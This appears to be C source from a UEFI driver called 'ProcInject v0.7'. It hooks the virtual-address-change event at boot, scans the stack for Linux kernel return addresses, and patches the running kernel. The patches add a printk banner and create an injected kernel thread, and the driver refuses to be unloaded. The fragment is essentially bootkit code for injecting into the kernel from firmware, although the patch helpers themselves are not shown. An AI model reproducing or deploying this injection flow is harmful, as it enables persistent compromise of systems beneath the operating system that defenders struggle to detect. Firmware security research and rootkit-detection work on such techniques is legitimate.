	EFI_STATUS efiStatus;
	INJECT_RUNTIME_CONTEXT injectContext;
	UINT64* rsp;

	UNREFERENCED_PARAMETER(Event);
	UNREFERENCED_PARAMETER(Context);

	//
	// Announce callback entry
	//
	LOG_INFO("=================================================");
	LOG_INFO("VirtMemCallback Started - Beginning Injection");
	LOG_INFO("=================================================");

	//
	// Initialize runtime context
	//
	efiStatus = InitializeInjectContext(&injectContext, &gInjectConfig);
	if (EFI_ERROR(efiStatus)) {
		LOG_ERROR(INJECT_ERROR_INVALID_PARAMETER, "Failed to initialize inject context: %r", efiStatus);
		return;
	}

	//
	// Get current stack pointer to search for kernel return addresses
	//
	rsp = AsmGetRsp();
	injectContext.Stack.StackPointer = rsp;
	LOG_DEBUG("Stack pointer: 0x%llx", (UINT64)rsp);

	//
	// Step 1: Find efi_enter_virtual_mode return address
	//
	LOG_INFO("Step 1: Finding efi_enter_virtual_mode return address");
	efiStatus = FindEfiEnterVirtualModeReturnAddr(&injectContext);
	if (EFI_ERROR(efiStatus)) {
		LOG_ERROR(INJECT_ERROR_EEVM_NOT_FOUND, "Step 1 FAILED - Aborting injection");
		injectContext.LastError = efiStatus;
		return;
	}
	MarkStepCompleted(&injectContext, INJECT_STEP_EEVM_FOUND);
	LOG_INFO("Step 1: SUCCESS");

	//
	// Step 2: Calculate kernel function addresses
	//
	LOG_INFO("Step 2: Calculating kernel function addresses");
	efiStatus = CalculateKernelFunctionAddresses(&injectContext);
	if (EFI_ERROR(efiStatus)) {
		LOG_ERROR(INJECT_ERROR_PRINTK_CALC_FAILED, "Step 2 FAILED: %r", efiStatus);
		injectContext.LastError = efiStatus;
		return;
	}
	MarkStepCompleted(&injectContext, INJECT_STEP_ADDRESSES_CALCULATED);
	LOG_INFO("Step 2: SUCCESS");

	//
	// Step 3: Install Patch 1 - Printk banner
	//
	LOG_INFO("Step 3: Installing Patch 1 (printk banner)");
	efiStatus = InstallPatch1_PrintkBanner(&injectContext);
	if (EFI_ERROR(efiStatus)) {
		LOG_ERROR(INJECT_ERROR_PATCH1_INSTALL_FAILED, "Step 3 FAILED: %r", efiStatus);
		injectContext.LastError = efiStatus;
		return;
	}
	MarkStepCompleted(&injectContext, INJECT_STEP_PATCH1_INSTALLED);
	LOG_INFO("Step 3: SUCCESS");

	//
	// Step 4: Find arch_call_rest_init
	//
	LOG_INFO("Step 4: Finding arch_call_rest_init");
	efiStatus = FindArchCallRestInit(&injectContext);
	if (EFI_ERROR(efiStatus)) {
		LOG_ERROR(INJECT_ERROR_ARCH_CALL_REST_INIT_INVALID, "Step 4 FAILED - Aborting injection");
		injectContext.LastError = efiStatus;
		return;
	}
	MarkStepCompleted(&injectContext, INJECT_STEP_ARCH_CALL_FOUND);
	LOG_INFO("Step 4: SUCCESS");

	//
	// Step 5: Find rest_init and complete(&kthreadd_done) call
	//
	LOG_INFO("Step 5: Finding rest_init and complete() call");
	efiStatus = FindRestInitCompleteCall(&injectContext);
	if (EFI_ERROR(efiStatus)) {
		LOG_ERROR(INJECT_ERROR_REST_INIT_NOT_FOUND, "Step 5 FAILED - Aborting injection");
		injectContext.LastError = efiStatus;
		return;
	}
	MarkStepCompleted(&injectContext, INJECT_STEP_REST_INIT_FOUND);
	LOG_INFO("Step 5: SUCCESS");

	//
	// Step 6: Install Patch 2 - Kernel thread creation
	//
	LOG_INFO("Step 6: Installing Patch 2 (kernel thread creation)");
	efiStatus = InstallPatch2_KthreadCreate(&injectContext);
	if (EFI_ERROR(efiStatus)) {
		LOG_ERROR(INJECT_ERROR_PATCH2_INSTALL_FAILED, "Step 6 FAILED: %r", efiStatus);
		injectContext.LastError = efiStatus;
		return;
	}
	MarkStepCompleted(&injectContext, INJECT_STEP_PATCH2_INSTALLED);
	LOG_INFO("Step 6: SUCCESS");

	//
	// All patches installed successfully
	//
	LOG_INFO("=================================================");
	LOG_INFO("ALL PATCHES INSTALLED SUCCESSFULLY!");
	LOG_INFO("Injection Complete - Control Returning to Kernel");
	LOG_INFO("=================================================");
}

EFI_STATUS
EFIAPI
UefiUnload (
    IN EFI_HANDLE ImageHandle
    )
{
    //
    // Do not allow unload
    //
    return EFI_ACCESS_DENIED;
}

EFI_STATUS
EFIAPI
UefiMain (
    IN EFI_HANDLE ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
    )
{
    EFI_STATUS efiStatus;

    //
    // Initialize logging system
    // Use DEBUG level for development, INFO for production
    //
    LogInitialize(LOG_LEVEL_DEBUG);

    LOG_INFO("=================================================");
    LOG_INFO("ProcInject v0.7 Starting");
    LOG_INFO("=================================================");

    //
    // Initialize kernel configuration
    //
    efiStatus = InitializeKernelConfig(&gInjectConfig);
    if (EFI_ERROR(efiStatus)) {
        LOG_ERROR(INJECT_ERROR_CONFIG_INVALID,
                 "Failed to initialize kernel configuration: %r", efiStatus);
        Print(L"Failed to initialize kernel configuration: %r\n", efiStatus);
        return efiStatus;
    }

    LOG_INFO("Kernel target: %a", gInjectConfig.KernelConfig->VersionString);
    LOG_INFO("VirtualMemCallback address: 0x%llx", (UINT64)VirtMemCallback);

    Print(L"ProcInject v0.7 - Kernel target: %a\n", gInjectConfig.KernelConfig->VersionString);
    Print(L"VirtualMemCallback = 0x%llx...\n", (UINT64)VirtMemCallback);
    //
    // Install the SetVirtualAddressMap callback
    //
    efiStatus = gBS->CreateEvent(
        EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE,
        TPL_NOTIFY,
        VirtMemCallback,
        NULL,
        &mVirtMemEvt
    );

    //
    // Install required driver binding components
    //
    efiStatus = EfiLibInstallDriverBindingComponentName2(ImageHandle,
                                                         SystemTable,
                                                         &gDriverBindingProtocol,
                                                         ImageHandle,
                                                         &gComponentNameProtocol,
                                                         &gComponentName2Protocol);
    return efiStatus;
}

